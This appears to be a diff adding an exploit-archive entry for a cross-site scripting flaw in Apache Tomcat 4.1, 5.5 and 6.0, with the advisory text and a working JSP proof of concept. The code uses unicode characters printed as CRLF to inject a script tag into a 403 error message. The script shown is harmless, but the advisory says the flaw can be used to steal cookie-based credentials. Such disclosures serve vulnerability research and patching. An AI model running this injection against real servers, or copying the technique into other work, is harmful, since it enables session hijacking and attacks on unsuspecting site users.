@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/30496/info
+
+Apache Tomcat is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+The issue affects the following versions:
+
+Tomcat 4.1.0 through 4.1.37
+Tomcat 5.5.0 through 5.5.26
+Tomcat 6.0.0 through 6.0.16 
+
+<%@page contentType="text/html"%>
+<%
+~  // some unicode characters, that result in CRLF being printed
+~  final String CRLF = "\u010D\u010A";
+
+~  final String payload = CRLF + CRLF + "<script
+type='text/javascript'>document.write('Hi, there!')</script><div
+style='display:none'>";
+~  final String message = "Authorization is required to access " + payload;
+~  response.sendError(403, message);
+%>
